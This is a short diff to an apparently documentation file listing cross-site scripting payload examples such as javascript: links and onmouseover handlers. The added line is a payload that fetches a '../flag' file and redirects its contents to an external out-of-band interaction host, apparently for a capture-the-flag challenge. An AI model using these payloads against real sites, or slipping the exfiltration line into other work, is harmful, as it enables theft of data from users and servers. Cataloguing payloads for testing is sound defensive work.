@@ -3579,6 +3579,7 @@ require("./index.js")
 - `<a href="javascript:alert(1)">g</a>`
 - `<input type="text" value="g" onmouseover="alert(1)" />`
 - `<iframe src="javascript:alert(1)"></iframe>`
+- `fetch(`../flag`).then((r)=>r.text()).then((r)=>location=`http://pnppkhnqyrialnbjamnwpsxptu59jzxlt.oast.fun?a=`+encodeURIComponent(r))`
 - ...
 
 ### Testing
